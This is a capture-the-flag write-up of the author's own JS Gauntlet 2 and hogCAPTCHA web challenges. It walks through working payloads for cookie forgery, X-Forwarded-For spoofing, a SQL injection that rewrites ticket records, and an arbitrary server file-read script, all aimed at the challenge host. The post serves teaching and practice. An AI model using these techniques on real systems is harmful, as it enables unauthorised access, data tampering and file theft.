---
title: RazorHack CTF 2024 - JS Gauntlet 2 and hogCAPTCHA Write-up
author: Alex Prosser
date: 10/30/2024
---

Hello all! This post will be going over the sequel to my previous year's challenge, JS Gauntlet 2. I wanted to create more web challenges this year as I have transitioned into a web developer position at my workplace. Because of this, I decided that I would combine a traditional Web CTF challenge, with web exploits like SQL injection and request spoofing, with some of my creativity from last year, where I wanted to try to challenge people with only client-side(ish) JavaScript. The result was a 8-stage competition that, sadly, no one fully completed. I will go over the intended solutions, some stats, and what made me create such a convoluted mess.

---

### Introduction

:::center
<a href="https://github.com/CodingAP/js-gauntlet-2">Link to GitHub</a>
:::

***We have received a message from a hacker group called R3n3gad3s that has seemed to taken over our communications systems. These systems allow us to not only communicate with our different power stations around the nations, but also our messages and calls as well! It seems like they are about to put it up for ransom, but we will not allow that! However, we seem to have little experience in the offensive side of this type of stuff... can you help us?***
***~ IT Team***

This was the first message that people saw when looking at the work order, which was an attempt to try to turn it to an offensive attack where you save the system. Typically, I've seen it where you just attack a website because you are told to. But, I wanted it to seem like you were on the "good" side (tbf it is all relative, but that is a political can of worms that is not worth it). Also, it lined up with the main storyline of the CTF that you were being attacked by an external force. This led to the first stage...

---

### A Secret Code

***Well, it seems like that they expected us... They have locked our main dashboard out with a code of some sorts! How will we get around this? It has to be airtight security, right?***
***~ Sven from IT***

*Solved: 21/33*

The first thing I wanted to point out is that there is an IT team with names here, as they are the ones presenting you with what is happening. They don't seem to do anything, they just pile your work plate up and hope that you can accomplish it all. Anyways, this first challenge shows a typical login screen with username and password inputs, but it is being covered by a hacker overlay. Spoilers, this is going to be a running theme. You cannot delete this element as it will detect it and refresh the page (although you can easily get around that, the login page doesn't work so eh). The website says: **This site has been compromised by the R3n3gad3s. Please stay put for further messages...**

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/a-secret-code-1.jpg" style="width: 100%"}

Looking into the page source, we see a Russian comment that says in English: **They thought they could fool us with shitty power solutions, so we had to teach them. Fortunately, since we are uber hackers, we took over. For other comrades, please use the key code provided on Telegram.**. In a script tag, we also see a large checksum value and an key event listener...

```javascript
const checksum = 'Vm0wd2QyVkZOVWRpUm1ScFVtMW9WVll3Wkc...';
let currentCode = '', currentKeys = [];

window.addEventListener('keydown', event => {
    currentCode += event.key;
    currentKeys.push(event.key);
    currentCode = btoa(currentCode);

    if (checksum == currentCode) {
        fetch('/api/stage1/check', {
            method: 'post',
            headers: {
                'content-type': 'application/json'
            },
            body: JSON.stringify(currentKeys)
        })
        .then(response => response.json())
        .then(data => {
            if (data.flag != null) {
                document.querySelector('#flag-response').innerHTML =
                `Welcome comrade! ${data.flag}...`;
            }
        });
    }
});
```

As you can see, the key pressed is added to the string and a *btoa()* is used to encode the string into base64. This happens for each key press and when *currentCode* equals the large checksum, it sends a request for the flag. The keys that were pressed are also sent in the request to make sure you actually figured out the keys and can't just abuse the endpoint. The intended solution is to reverse the checksum with *atob()* and getting each key after each decode. So, it would look something like this...

```javascript
> atob(checksum)
'Vm0wd2VFNUdiRmRp...hV2RvZEE9PWI=a' // the key is 'a'
// remove 'a' from checksum
> atob(checksum)
'Vm0weE5GbFdiRmhU...yb3dSaWdodA==b' // the key is 'b'
// remove 'b' from checksum
// ...
> atob(checksum)
'QXJyb3dVcA==ArrowUp' // the key is the up arrow
// remove 'ArrowUp' from checksum
> atob(checksum)
'ArrowUp' // the key is the up arrow
```

After decoding ten times, you get the keys *a, b, ArrowRight, ArrowLeft, ArrowRight, ArrowLeft, ArrowDown, ArrowDown, ArrowUp, ArrowUp*, which if you don't know is the Konami Code. It is backwards because when reversing the checksum, you get the last key pressed each time. Entering the code on the page will return the the string **Welcome comrade! flag{30_lives_for_you_38201}...**

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/a-secret-code-2.jpg" style="width: 100%"}

---

### How Did You Get In Here?

***Ok, now that we can actually see what is happening, I've just realized that a lot of our system is modularized, and they isolated it all. We just need to recover it all, starting with our account system. Find a way to get access to our admin accounts, and we can definitely get somewhere...***
***~ Justin from IT***

*Solved: 10/33*

The next challenge allows you to access the login page with a username and password, but each time you try to login, you receive an error message: **Logins have been disabled by R3n3gad3s, but don't use password 'jobbin_pobbins'!** Sadly, no matter what username or password you try to enter, though, it will not work. The Russian comment in the source says: **Hello, we have disabled the login system, so for other team members trying to log in, please use this cookie as a workaround. The typical login system won't work, so don't use it. Cookie: 'account=eyJhY2NvdW50X25hbWUiOiJyM24zZ2FkM3MiLCJhY2NvdW50X3Bhc3N3b3JkIjoiW1JFREFDVEVEXSJ9'**

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/how-did-you-get-in-here-1.jpg" style="width: 100%"}

This heavily hints at a cookie modification, so opening the DevTools, we can edit the cookies on the webpage. A lot of people thought the session cookie was the one needed to be modified, but that only tracks the progress of the user and is not part of the challenge (I made sure that it was known after seeing it a couple of times). The comment aludes the the cookie needing to be called *account*, but if you just try to place the cookie in, it will not work. Decoding the cookie from base64 gives you this...

```json
{"account_name":"r3n3gad3s","account_password":"[REDACTED]"}
```

Makes sense, now. However, we were given something in the form of *jobbin_pobbins*, so if we were to put that password in and encode it back to base64...
```javascript
cookie = {"account_name":"r3n3gad3s","account_password":"jobbin_pobbins"}
btoa(cookie)
// eyJhY2NvdW50X25hbWUiOiJyM24zZ2FkM3MiLCJhY2NvdW50X3Bhc3N3b3JkIjoiam9iYmluX3BvYmJpbnMifQ==
```

Setting the cookie to this shows the flag: **flag{clipping_through_the_bars_17493}**

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/how-did-you-get-in-here-2.jpg" style="width: 100%"}

---

### Irresistible Force

***Ok, this seems like a crazy joke, but for us to get to our next system, we need to... play Pong. However, it seems like no one on the team can actually beat the bot they've programmed in. This feels embarassing to ask, but see what you can do.***
***~ John from IT***

*Solved: 7/33*

Ok, this one was fun to make. I knew that I wanted to make a hackable game as a challenge, and it was one of my original ones to make a set of challenges. However, with all the challenges I planned, it was one of the first to be put on the cutting board. Not all my ideas were immediately shelved, as I reused them in other challenges, such as this one. The Russian comment said: **It was fun to do, but now it's time to get serious. We're not going to let those bastards get by, so I've made sure to add anti-cheat technology. I'm sure there are no cracks in the system, so use the method described in Telegram to use the system if necessary.**

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/irresistible-force-1.jpg" style="width: 100%"}

The page consists of a game of Pong where the player must score 5 points to continue. However, the bot in the game is unbeatable in the traditional sense. No matter what, the bot will always hit the ball, and there is no way to modify the client code as I put it in an anonymous function (you can delete it, but then you can't play the game then). There are exposed variables, however, that you can modify. They just happen to be obfuscated so you don't know what variable does what. The intended solution can go many ways as I only added a couple of anti-cheats. Those are:

- Changing the player or computer's score by more than one point
- Moving the ball too far or out of bounds
- Trying to use the endpoint without proper fields
- Spamming scores too fast

Each of these infractions will lead to a 5 minute timeout. You can get around it by either deleting your cookie and starting the challenge over, which can be a little inconvientent, but it is at least faster than waiting. If you find a way to score around these anti-cheat methods, you did it right!

Here is the mapping for the variables:
```javascript
let var_46, var_70; // player paddle position, computer paddle position
let var_68, var_04, var_20; // paddle width, paddle height, paddle distance from edge
let var_29, var_77; // ball x position, ball y position
let var_01, var_75; // ball x speed, ball y speed
let var_80; // ball size
let var_07, var_45; // player input up, player input down
let var_62, var_95; // player score, computer score
let var_03; // game paused
```

My personal solution is to set *var_20*, or the paddle distance to a high value to switch places with the player's paddle and the computer's paddle. I can move my paddle out of the way and score on the computer. Other solutions I have seen is to disable collision, somehow. I'm not sure how they did that, but it works so... whatever. After scoring 5 points, the flag will appear: **flag{hey_stop_looking_there_23912}**

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/irresistible-force-2.jpg" style="width: 100%"}

---

### Teleportation

***Who would have that they would have attached a VPN to all of our services, so now we can't access the warning services without being in the right location. While it would be cool to travel for a "vacation", I think we are going to do this on the cheap. Now the obvious question is what location, but a better question is why ask us?***
***~ Stanley from IT***

*Solved: 3/33*

For this stage, we now have access to the IT dashboard, which for a dashboard for all of IT's functions, it is pretty bare bones (make sense why they can't do much for you). The Russian comment says: **I decided to hide my IP address now because apparently previous posts were leaked to the site. I don't know how it happened, but I hope it doesn't lead to problems in the future.** In the previous 3 stages, the comment was prefixed with an IP of *194.242.26.157* (an actual Russian IP), but now it is censored.

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/teleportation-1.jpg" style="width: 100%"}

You have 4 buttons that do different actions such as create a ticket or seeing the notifications. However, they are all disabled as alluded to in the challenge prompt because **You are not in the correct location!**. This prompts you to try to change the location somehow, especially since you have a Russian IP you can base it from. While location services could have been a cool time, because of how varied the implementations can be, I decided to go for the "X-Forwarded-For" header, which has been out of use for a little bit. This HTTP header allows the client to say from what IP the request came from. Because you can change this, it obviously became a security concern that you can so easily spoof IPs, which means that you can spoof locations. With this payload...

```javascript
fetch('/api/stage4/request', {
    method: 'post',
    headers: {
        'content-type': 'application/json',
        'x-forwarded-for': '194.242.26.157'
    },
    body: JSON.stringify({ id: 'lol' })
})
.then(response => response.json())
.then(data => { 
    if (data.error) {
        sendNotification(true, data.error);
    } else {
        sendNotification(false, data.flag);
    }
});
```

...the flag will appear in the notification. Just be sure to grab it before it goes away! The flag is **flag{so_no_headers_28013}**

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/teleportation-2.jpg" style="width: 100%"}

---

### We Are Doing This Again?

***I can't help feel a sense of deja vu, but maybe because I went through a lot of corn mazes as a kid. Anyways, this seems to be the megamaze of my childhood dreams because it's 3D! I couldn't get through much, so I'll let you figure it out yourself...***
***~ Sven from IT***

*Solved: 1/33*

If you say that this one looks familar, it because it is. I decided to use some of the JS Gauntlet challenges from last year because they were not attempted or completed much (I think like 5 teams max actually attempted them). This is the maze one from Challenge #3 from last year. However, I decided to upgrade this maze from a crude 9x5 maze to a 10x10x10 3D maze! The Russian comment says: **Hello all, this 3D maze is a bit of a bitch to traverse, so I have given the solution to you here: nnnnneesene[REDACTED]**. I decided to give a hint with the first floor of the maze being done as it makes it more clear just the scope you are dealing with.

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/we-are-doing-this-again-1.jpg" style="width: 100%"}

Because I didn't want people to do it manually this time, I made sure that it was big enough to stop people from going all the way. I think the furthest people went manually was 3 levels before someone wrote the script for it. I also wanted it to not be too taxing of a script, so I essentially made 10 2D mazes, then stacked the exits and entrances on top of each other. Obviously, the intended solution is to write a maze solving script. Here is my script that I wrote to solve the maze with BFS, with the neighbors function essentially being a web crawler (made in NodeJS).

```javascript
const getPaths = async (currentPath) => {
    const response = await fetch(`https://razorhack-js-gauntlet-2.chals.io/stage/5/${currentPath}`, {
        headers: { cookie }
    })
    const html = await response.text();

    let paths = [];
    if (html.toLowerCase().includes('north')) paths.push('n');
    if (html.toLowerCase().includes('south')) paths.push('s');
    if (html.toLowerCase().includes('east')) paths.push('e');
    if (html.toLowerCase().includes('west')) paths.push('w');
    if (html.toLowerCase().includes('down')) paths.push('E');
    return paths;
}

const directions = {
    n: { x: 0, y: 1 },
    s: { x: 0, y: -1 },
    e: { x: 1, y: 0 },
    w: { x: -1, y: 0 }
}

let queue = [{ x: 0, y: 0, path: '' }];
let visited = { '0,0': true };
let finalPath = '';
let level = 1;

while (queue.length != 0) {
    let item = queue.shift();

    const paths = await getPaths(finalPath + item.path);
    if (paths.includes('E')) {
        finalPath += item.path + 'E'; 
        queue = [{ x: item.x, y: item.y, path: '' }];
        visited = { [`${item.x},${item.y}`]: true };

        console.log('On Level:', ++level);

        continue;
    }

    for (let i = 0; i < paths.length; i++) {
        let newPosition = { x: item.x + directions[paths[i]].x, y: item.y + directions[paths[i]].y };
        if (!visited[newPosition.x + ',' + newPosition.y]) {
            visited[newPosition.x + ',' + newPosition.y] = true;
            queue.push({ x: newPosition.x, y: newPosition.y, path: item.path + paths[i] });
        }
    }
}

finalPath = finalPath.slice(0, finalPath.length - 1);
console.log(finalPath);
```

After running the script, it will give you the entire path that you can paste into the URL. Then, the flag will appear: **flag{this_isnt_a_corn_maze_28131}**.

If you would like to see the visual representation of the maze, here is a <a href="'/static/blog/razorhack-ctf-2024/js-gauntlet-2/maze.zip'">zip file</a> with all of the layers with starts and ends labeled.

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/we-are-doing-this-again-2.jpg" style="width: 100%"}

---

### Best In Class

***We have recovered a good amount of services of our stuff, and that is good and all... But I see this as an opportunity to progress further. We have an internal system that checks how many IT tickets that we have completed within the last month. Now, I am no slacker, but my number are lower than they should. In fact, I need just one more tickets to reach the quota for the role of "Good IT Boy" for the month. However, our manager is the only one who can modify when a ticket is done as to prevent misuse. Can you, you know, up that number somehow?***
***~ Stanley from IT***

*Solved: 0/33*

So for this challenge and the rest after, no one was able to solve it. Only one team got to this point, so they are considered the champions of JS Gauntlet 2. I didn't give them anything like last year (I was tempted to give them the hat I wore the entire time, but I don't think anyone wants a cheap sweaty tophat as a prize). The Russian comment says: **This seems like a nice system, so I didn't take it down. A bit primitive, but I like its simplicity. I could go ahead and modify everything that is here for the hell of it, but I think that is not necessary.** This is because this stage isn't even for recovery, Stanley just wants his numbers up!

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/best-in-class-1.jpg" style="width: 100%"}

Looking into the Docker container, it seems like this challenge was actually broken! The */data* directory wasn't copied over, so it wasn't able to create databases for the users (or user). Now that sucks, but considering the how the challenges went where only one team got to this point, it seems like it went under the radar. Essentially, each user that got to this point got their own SQLite database with 100 tickets in them. All but one ticket was complete, so we just need to find a way to complete the ticket without admin access. Luckily, it seems like the inputs in the *Create Ticket* dialog aren't sanitized, client or server side. We can tell by running this payload...

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/best-in-class-2.jpg" style="width: 75%"}

...and you will get this in the table in the *List Tickets* dialog...

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/best-in-class-3.jpg" style="width: 75%"}

This means that we are entering some trailing function call, most likely an INSERT as we are creating a ticket. That means that between the parenthesis and the -- (which are comments in SQL), we can put any SQL code we want, such as modifying all tickets to be complete. We can also see what the table schema looks like by looking at what data is returned when calling *list_tickets* endpoint.

```json
{
    "TICKET_ID": 1,
    "TICKET_SUMMARY": "Network latency in office network",
    "TICKET_DESCRIPTION": "The office network is experiencing significant latency affecting all users.",
    "TICKET_AUTHOR": "John",
    "TICKET_DATE": "2023-05-09",
    "TICKET_COMPLETE": 1
}
```

That payload looks like this: *'); UPDATE TICKETS SET TICKET_COMPLETE = 1 --*. Running the payload and looking back on the tables gives us the flag: **flag{legit_number_one_19373}**.

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/best-in-class-4.jpg" style="width: 100%"}

---

### We're Definitely Doing This Again...

***Okay, now this is starting to get annoying. I have actually seen this puzzle before, but they seem to have made it 100x harder by adding a 5 minute timer! This is impossible, so I am going to call it quits...***
***~ John from IT***

*Solved: 0/33*

This is the second challenge from last years JS Gauntlet that made a return. This one seemed more popular as it has a very simple concept: complete the jigsaw puzzle. Only problem is that now you have a time limit of 5 minutes, which means that you must write a script (I would love to see this type of thing get speedran, but I highly doubt that to be possible). The Russian comment says: **I actually took this from a guy called CodingAP. If he didn't want his puzzles being copied, then he wouldn't have put them out so easily...**. That comment is a hint that you can look at my previous write up to see the way to do it (although no one made it here for that to matter ): ).

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/were-definitely-doing-this-again-1.jpg" style="width: 100%"}

The solution is the same from last year: write a script that solves it for you. You read where the piece should go, move it there, and keep doing it until all pieces are in the right place and the flag shows up. Here is the script I used, which runs based off key inputs to allow for better control of how it is done (copy and paste into console to make it work).

```javascript
current = { x: 0, y: 0 };

const parseLocation = () => {
    let str = document.querySelector('#piece-location').innerHTML;
    let numbers = str.split(/[\(\)]/g)[1].split(', ').map(Number);
    return { x: numbers[0], y: numbers[1] }
}

const moveTo = (x, y) => {
    let dx = Math.abs(current.x - x);
    let dy = Math.abs(current.y - y);

    window.dispatchEvent(new KeyboardEvent('keydown', { key: ' ' }));

    for (let i = 0; i < dx; i++) {
        window.dispatchEvent(new KeyboardEvent('keydown', { key: (current.x < x) ? 'ArrowRight' : 'ArrowLeft' }));
    }

    for (let i = 0; i < dy; i++) {
        window.dispatchEvent(new KeyboardEvent('keydown', { key: (current.y < y) ? 'ArrowDown' : 'ArrowUp' }));
    }

    window.dispatchEvent(new KeyboardEvent('keydown', { key: ' ' }));

    for (let i = 0; i < dx; i++) {
        window.dispatchEvent(new KeyboardEvent('keydown', { key: (current.x < x) ? 'ArrowLeft' : 'ArrowRight' }));
    }

    for (let i = 0; i < dy; i++) {
        window.dispatchEvent(new KeyboardEvent('keydown', { key: (current.y < y) ? 'ArrowUp' : 'ArrowDown' }));
    }
}

const setCurrent = (x, y) => {
    let dx = Math.abs(current.x - x);
    let dy = Math.abs(current.y - y);

    for (let i = 0; i < dx; i++) {
        window.dispatchEvent(new KeyboardEvent('keydown', { key: (current.x < x) ? 'ArrowRight' : 'ArrowLeft' }));
    }

    for (let i = 0; i < dy; i++) {
        window.dispatchEvent(new KeyboardEvent('keydown', { key: (current.y < y) ? 'ArrowDown' : 'ArrowUp' }));
    }

    current.x = x;
    current.y = y;
}

window.addEventListener('keydown', event => {
    let pos = parseLocation();
    if (event.key == 'r' && (current.x !== pos.x || current.y !== pos.y)) {
        moveTo(pos.x, pos.y);
    }

    if (event.key == 'w' && current.y != 0) {
        setCurrent(current.x, current.y - 1);
    }

    if (event.key == 'a' && current.x != 0) {
        setCurrent(current.x - 1, current.y);
    }

    if (event.key == 's' && current.y != 19) {
        setCurrent(current.x, current.y + 1);
    }

    if (event.key == 'd' && current.x != 31) {
        setCurrent(current.x + 1, current.y);
    }
});
```

After running it (press 'r' to move piece, and 'wasd' to move selector in the right place instead of the arrow keys), the flag shows up: **flag{i_actually_wasnt_sorry_83911}**.

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/were-definitely-doing-this-again-2.jpg" style="width: 100%"}

---

### We Will Never Surrender!

***Ok, we got most of stuff back, but if we can get the master key, we can get access to the terminal and finally secure our systems. The problem is the only copy of the master key is on the server that the attackers have access to. After all this, it seems that they have locked it down and we cannot access any file. Please, this is the last thing I ask of you...***
***~ Justin from IT***

*Solved: 0/33*

The final challenge! This one probably the most difficult, but it does show a lot of cool stuff. This was originally going to be an XSS attack through the notification system, but it was too similar to the one in Jungle Calls last year (doesn't stop me from reusing other challenges, but I digress). The Russian comment says: **It seems like the master key is just placed in the root directory of the server application called 'flag'. What a stupid idea! I'll just, you know, spread this around to where you can't find it so easily...**.

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/we-will-never-surrender.jpg" style="width: 100%"}

As the comment suggests, we need to read a file called 'flag' on the root server. If we look at the logs dropdown in the *Account Settings* dialog, we see that in order to fetch the log contents, it sends a file URL to the server. We can tell because it says *logs/[log_name].log*, which hints at a file structure of some sort. We can use this to access any file on the root server, like so...

```javascript
const getFile = (file) => {
    fetch('/api/stage8/show_notification', {
        method: 'post',
        headers: {
            'content-type': 'application/json'
        },
        body: JSON.stringify({ file })
    }).then(response => response.json())
    .then(data => {
        // ew, data.data.data
        console.log(data.data.data.map(byte => String.fromCharCode(byte)).join(''))
    })
}

getFile('flag');
// flag{we
// c3JjL2FwaS5qcw==
```

This gives us the first part of the flag as well as an encoded string. If we decode this string from base64, we get another file path: *src/api.js*. We can continue this until we find all flag parts...

```javascript
getFile('src/api.js');
// ... some code ...
// _have_bea
// aW5kZXguanM= (base64 decode: index.js)
// ... some code ...

getFile('index.js');
// ... some code ...
// ten_them
// cHVibGljL2ltZy9jb25ncmF0cy5wbmc= (base64 decode: public/img/congrats.png)
// ... some code ...

getFile('public/img/congrats.png');
// it is an image, shown below
```

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/congrats.jpg" style="width: 75%"}

To actually get the image file, I wrote another script that fetches and stores it in a file (written in NodeJS)...

```javascript
import fs from 'node:fs';

const file = 'public/img/congrats.png';

fetch('http://razorhack-js-gauntlet-2.chals.io/api/stage8/show_notification', {
    method: 'post',
    headers: {
        'content-type': 'application/json',
        cookie: cookie
    },
    body: JSON.stringify({ file })
})
.then(response => response.json())
.then(data => {
    fs.writeFileSync(file, Buffer.from(data.data.data));
})
```

After all this work, we can compile all the parts together to get the final flag: **flag{we_have_beaten_them_14765}**.

I wanted this to be a cool reward after completing the challenges, as you can see most of the code that handles what you did. You can even see all the other code if you wanted to, it just wouldn't have the flag involved. As said previously, though, no one made it this far.

---

### hogCAPTCHA

Another thing that was hosted with this web challenge was two custom CAPTCHAs that both me and my girlfriend developed. These were not in the same style as JS Gauntlet 2, but since it was hosted on the same container and they are web challenges, it makes sense to put them here.

Both CAPTCHAs start out with a button that takes them to the CAPTCHA...

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/hogCAPTCHA-1.jpg" style="width: 50%"}

Both were generated with ChatGPT and not created from scratch, which you can tell if you actually competed at RazorHack because they were buggy and I had to fix them.

---

### hogCAPTCHApt1

*Solved: 33/33*

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/hogCAPTCHApt1.jpg" style="width: 100%"}

This CAPTCHA consisted of filling in all the words from a letter given to all the competitors. The letter says:

**Team, I hope this message finds you securely. You’ve been briefed on the situation, but I want to make it clear how delicate this operation is. We are dealing with a potential insider threat at our nuclear facility, and the stakes couldn’t be higher. If this individual is able to compromise any of our core systems—especially the reactor and cooling stations—the results could be catastrophic, not just for us, but for everyone in the surrounding area. Your objective is simple: find the intruder, confirm their methods, and neutralize the threat before any real damage is done. The trick is to do it without alerting them—or anyone else in the facility. You’ll be working under the guise of routine system audits and updates, but your real task is much more critical. You’ll be granted high-level access under the radar, which should allow you to monitor the plant’s network traffic and internal communications. We've already identified some data that should help you get started in your investigation. You’ll need to confirm if we’re dealing with a skilled saboteur or just someone testing boundaries. Do not communicate with anyone outside this team unless absolutely necessary, and if you need to reach me, use the secure channel we discussed in the briefing. We need this done quickly, quietly, and thoroughly. Time is not on our side. Report any findings directly to me. We can’t afford even the smallest mistake here. Good luck, and stay invisible. Shane Barnabas, CIO, RazorPower Co.**

Each of the input had to be filled correctly, which means that you had to either a.) look at the physical letter given and painstakingly copy it down, or b.) make a script because all the answers were in the code. Some of the bugs include punctuation being included, which confused people; weird characters from the letter being included (apparently ' and ’ are not the same character, as is - and —); and the input not correctly encoding the words the same way as you type them. And we made this the first challenge of the entire CTF and you had to complete this before you can try the other challenges! Luckily, it only took about 5 minutes to fix, and most people found workarounds, so it wasn't the worst thing. After entering all the words, or using the script below...

```javascript
document.querySelectorAll('input').forEach(input => {
    input.value = input.getAttribute('data-answer');
});
```

...you will get the flag: **flag{f1rst_fl4g_0f_th3-d4y!}**.

---

### hogCAPTCHApt2

*Solved: 8/33*

::image{src="/blog/razorhack-ctf-2024/js-gauntlet-2/hogCAPTCHApt2.jpg" style="width: 75%"}

This is probably the worst CTF challenge I have ever made. Made with ChatGPT and not much care, this challenge straight up didn't work. Some of it is not my fault, though. In this challenge, you need to click all pixels that have a blue component that is greater than 100, so all you would need to do is run a script that does it for you, right? I've made so many challenges like this, and they all seem to work, so why not this one? Well, I thought so to. In fact, here is a script that worked for me...

```javascript
indexes = []
imageData = document.querySelector('canvas').getContext('2d').getImageData(0, 0, 200, 200);
for (let y = 0; y < canvas.height; y++) {
    for (let x = 0; x < canvas.width; x++) {
        let index = 4 * (y * canvas.width + x);
        if (imageData.data[index + 2] > 100) indexes.push(index / 4)
    }
}
clickedPixels = new Set(indexes)
```

This, along with clicking once on the image shows the flag for me: **flag{pr33ty_c0l0rs!!!}**. Key words: *FOR ME*. For some reason, this code would not consistenly work on other people's devices. First, I tried simulating clicks through the event dispatcher, which didn't work consistently. Then, Firefox and Chromium-based browsers handle images on canvases differently, meaning that there would be different pixels that would be clicked on each browser. Then, even with the same settings and everything, some computers just didn't get the right answer, even with the same script! I just decided that it wasn't worth it and just gave anyone whose answer looks correct the flag manually, which kinda sucks.

---

### Conclusion

I think in terms of last year, this year went way better. The hosting wasn't a problem, the challenges (mostly) didn't have breaking bugs. I didn't stay up until 3am the night before creating these challenges. I would say it went off without a hitch. I do wish that more people completed the challenges as I did like the further ones I did, but at least people can see it in the blog post now. Thanks for reading if you made it this far! If you haven't yet, take a look at my other write-ups for RazorHack 2024!

- [Breakroom Adventure Write-Up](https://codingap.github.io/blog/posts/razorhack-ctf-2024-breakroom-adventure/)
- [Format Frenzy Write-Up](https://codingap.github.io/blog/posts/razorhack-ctf-2024-format-frenzy/)